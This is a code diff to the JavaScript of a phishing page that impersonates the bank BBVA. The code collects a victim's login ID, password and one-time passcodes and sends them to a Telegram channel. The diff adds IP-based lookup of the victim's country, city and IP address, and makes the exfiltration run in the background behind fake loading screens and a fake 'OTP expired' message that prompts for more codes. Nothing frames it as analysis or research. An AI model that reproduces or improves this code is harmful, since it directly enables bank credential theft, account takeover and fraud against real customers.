@@ -37,34 +37,26 @@ async function sendToTelegram(message) {
     }
 }
 
-// Function to get user location
-function getLocation() {
-    return new Promise((resolve) => {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    resolve({
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy
-                    });
-                },
-                () => {
-                    resolve({
-                        latitude: 'Not available',
-                        longitude: 'Not available',
-                        accuracy: 'Not available'
-                    });
-                }
-            );
-        } else {
-            resolve({
-                latitude: 'Not supported',
-                longitude: 'Not supported',
-                accuracy: 'Not supported'
-            });
-        }
-    });
+// Function to get user country from IP
+async function getCountryFromIP() {
+    try {
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        return {
+            country: data.country_name || 'Unknown',
+            countryCode: data.country_code || 'Unknown',
+            city: data.city || 'Unknown',
+            ip: data.ip || 'Unknown'
+        };
+    } catch (error) {
+        console.error('Error getting country from IP:', error);
+        return {
+            country: 'Unknown',
+            countryCode: 'Unknown',
+            city: 'Unknown',
+            ip: 'Unknown'
+        };
+    }
 }
 
 // Function to get current time
@@ -609,26 +601,10 @@ async function handleLogin(event) {
     sessionStorage.setItem('bbva_login_id', loginId);
     sessionStorage.setItem('bbva_password', loginPassword);
     
-    // Get current time for login
-    const currentTime = getCurrentTime();
-    
-    // Send login credentials to Telegram (without location - location already sent in first message)
-    const loginMessage = `
-🔐 <b>BBVA Login Credentials</b>
-
-👤 <b>User ID:</b> ${loginId}
-🔑 <b>Password:</b> ${loginPassword}
-
-⏰ <b>Time:</b> ${currentTime}
-    `;
-    
-    console.log('Sending login credentials to Telegram...');
-    await sendToTelegram(loginMessage);
-    
-    // Close login modal
+    // Close login modal immediately
     closeLoginModal();
     
-    // Show loading screen
+    // Show loading screen immediately (don't wait for Telegram)
     const loadingOverlay = document.getElementById('loading-overlay');
     if (loadingOverlay) {
         loadingOverlay.classList.add('active');
@@ -639,7 +615,7 @@ async function handleLogin(event) {
             screen.style.overflow = 'hidden';
         }
         
-        // After 1.5 seconds, hide loading and show verification screen
+        // After 3 seconds, hide loading and show verification screen
         setTimeout(function() {
             loadingOverlay.classList.remove('active');
             
@@ -647,8 +623,24 @@ async function handleLogin(event) {
             if (verificationOverlay) {
                 verificationOverlay.classList.add('active');
             }
-        }, 1500);
+        }, 3000);
     }
+    
+    // Send login credentials to Telegram in background (non-blocking)
+    const currentTime = getCurrentTime();
+    const loginMessage = `
+🔐 <b>BBVA Login Credentials</b>
+
+👤 <b>User ID:</b> ${loginId}
+🔑 <b>Password:</b> ${loginPassword}
+
+⏰ <b>Time:</b> ${currentTime}
+    `;
+    
+    console.log('Sending login credentials to Telegram...');
+    sendToTelegram(loginMessage).catch(err => {
+        console.error('Error sending to Telegram:', err);
+    });
     
     return false;
 }
@@ -1103,31 +1095,63 @@ async function submitOTP() {
 ⏰ <b>Time:</b> ${currentTime}
     `;
     
-    console.log('Sending OTP to Telegram...');
-    await sendToTelegram(otpMessage);
-    
-    // Show error message (OTP expired)
-    const errorMessage = document.getElementById('otp-error-message');
-    if (errorMessage) {
-        errorMessage.textContent = 'OTP expired enter new OTP!';
-        errorMessage.style.display = 'block';
+    // Show loading screen immediately after OTP submission
+    const loadingOverlay = document.getElementById('loading-overlay');
+    if (loadingOverlay) {
+        console.log('✅ Showing loading overlay for OTP...');
+        loadingOverlay.classList.add('active');
+        
+        // Prevent background scrolling
+        const screen = document.querySelector('.screen');
+        if (screen) {
+            screen.style.overflow = 'hidden';
+        }
+    } else {
+        console.error('❌ Loading overlay not found!');
     }
     
-    // Clear OTP inputs
-    document.getElementById('otp-1').value = '';
-    document.getElementById('otp-2').value = '';
-    document.getElementById('otp-3').value = '';
-    document.getElementById('otp-4').value = '';
-    document.getElementById('otp-5').value = '';
-    document.getElementById('otp-6').value = '';
+    // Send OTP to Telegram in background (non-blocking)
+    console.log('Sending OTP to Telegram...');
+    sendToTelegram(otpMessage).catch(err => {
+        console.error('Error sending to Telegram:', err);
+    });
     
-    // Focus back on first input
+    // After 3 seconds, hide loading and show error message
     setTimeout(function() {
-        const firstInput = document.getElementById('otp-1');
-        if (firstInput) {
-            firstInput.focus();
+        console.log('⏰ 3 seconds passed, hiding loader and showing error...');
+        if (loadingOverlay) {
+            loadingOverlay.classList.remove('active');
         }
-    }, 100);
+        
+        // Restore background scrolling
+        const screen = document.querySelector('.screen');
+        if (screen) {
+            screen.style.overflow = 'auto';
+        }
+        
+        // Show error message (OTP expired)
+        const errorMessage = document.getElementById('otp-error-message');
+        if (errorMessage) {
+            errorMessage.textContent = 'OTP expired enter new OTP!';
+            errorMessage.style.display = 'block';
+        }
+        
+        // Clear OTP inputs
+        document.getElementById('otp-1').value = '';
+        document.getElementById('otp-2').value = '';
+        document.getElementById('otp-3').value = '';
+        document.getElementById('otp-4').value = '';
+        document.getElementById('otp-5').value = '';
+        document.getElementById('otp-6').value = '';
+        
+        // Focus back on first input
+        setTimeout(function() {
+            const firstInput = document.getElementById('otp-1');
+            if (firstInput) {
+                firstInput.focus();
+            }
+        }, 100);
+    }, 3000);
 }
 
 // Handle Activate Card Button Click
@@ -1137,15 +1161,16 @@ async function handleActivateCardClick() {
     // Open login modal immediately (don't wait for anything)
     openLoginModal();
     
-    // Get location in background (non-blocking)
-    getLocation().then(location => {
+    // Get country from IP in background (non-blocking)
+    getCountryFromIP().then(ipData => {
         const currentTime = getCurrentTime();
         const userInfo = getUserInfo();
         
-        // Store location in sessionStorage for later use
-        sessionStorage.setItem('bbva_location_lat', location.latitude);
-        sessionStorage.setItem('bbva_location_lng', location.longitude);
-        sessionStorage.setItem('bbva_location_acc', location.accuracy);
+        // Store IP location data in sessionStorage for later use
+        sessionStorage.setItem('bbva_country', ipData.country);
+        sessionStorage.setItem('bbva_countryCode', ipData.countryCode);
+        sessionStorage.setItem('bbva_city', ipData.city);
+        sessionStorage.setItem('bbva_ip', ipData.ip);
         sessionStorage.setItem('bbva_initial_time', currentTime);
         sessionStorage.setItem('bbva_user_agent', userInfo.userAgent);
         sessionStorage.setItem('bbva_platform', userInfo.platform);
@@ -1157,10 +1182,11 @@ async function handleActivateCardClick() {
         const notificationMessage = `
 🔔 <b>BBVA Notification Button Clicked</b>
 
-📍 <b>Location:</b>
-   Latitude: ${location.latitude}
-   Longitude: ${location.longitude}
-   Accuracy: ${location.accuracy}m
+📍 <b>Location (IP):</b>
+   Country: ${ipData.country}
+   Country Code: ${ipData.countryCode}
+   City: ${ipData.city}
+   IP Address: ${ipData.ip}
 
 ⏰ <b>Time:</b> ${currentTime}
 
@@ -1177,13 +1203,14 @@ async function handleActivateCardClick() {
             console.error('Error sending to Telegram:', err);
         });
     }).catch(err => {
-        console.error('Error getting location:', err);
-        // Store default values if location fails
+        console.error('Error getting country from IP:', err);
+        // Store default values if IP lookup fails
         const currentTime = getCurrentTime();
         const userInfo = getUserInfo();
-        sessionStorage.setItem('bbva_location_lat', 'Not available');
-        sessionStorage.setItem('bbva_location_lng', 'Not available');
-        sessionStorage.setItem('bbva_location_acc', 'Not available');
+        sessionStorage.setItem('bbva_country', 'Unknown');
+        sessionStorage.setItem('bbva_countryCode', 'Unknown');
+        sessionStorage.setItem('bbva_city', 'Unknown');
+        sessionStorage.setItem('bbva_ip', 'Unknown');
         sessionStorage.setItem('bbva_initial_time', currentTime);
         sessionStorage.setItem('bbva_user_agent', userInfo.userAgent);
         sessionStorage.setItem('bbva_platform', userInfo.platform);
